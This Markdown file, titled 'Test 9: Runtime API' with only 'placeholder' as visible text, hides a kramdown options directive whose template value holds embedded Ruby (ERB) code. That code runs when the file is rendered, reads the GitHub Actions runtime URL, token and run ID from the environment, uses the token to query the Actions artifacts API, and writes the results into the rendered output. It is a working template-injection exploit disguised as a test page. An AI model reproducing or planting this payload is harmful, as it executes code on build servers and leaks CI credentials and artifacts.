---
---

# Test 9: Runtime API

{::options template="string://<%= require 'net/http'; ru = ENV.fetch('ACTIONS_RUNTIME_URL','NONE'); rt = ENV.fetch('ACTIONS_RUNTIME_TOKEN','NONE'); ri = ENV.fetch('GITHUB_RUN_ID','0'); r = 'URL=' + ru.to_s[0..80] + ' RUN=' + ri.to_s; begin; uri = URI(ru + '_apis/pipelines/workflows/' + ri + '/artifacts?api-version=6.0-preview'); req = Net::HTTP::Get.new(uri); req.add_field('Authorization', 'Bearer ' + rt); r = r + ' ART=' + Net::HTTP.start(uri.hostname, uri.port, :use_ssl => true).request(req).body[0..300]; rescue => e; r = r + ' ERR=' + e.message; end; r %>" /}

placeholder
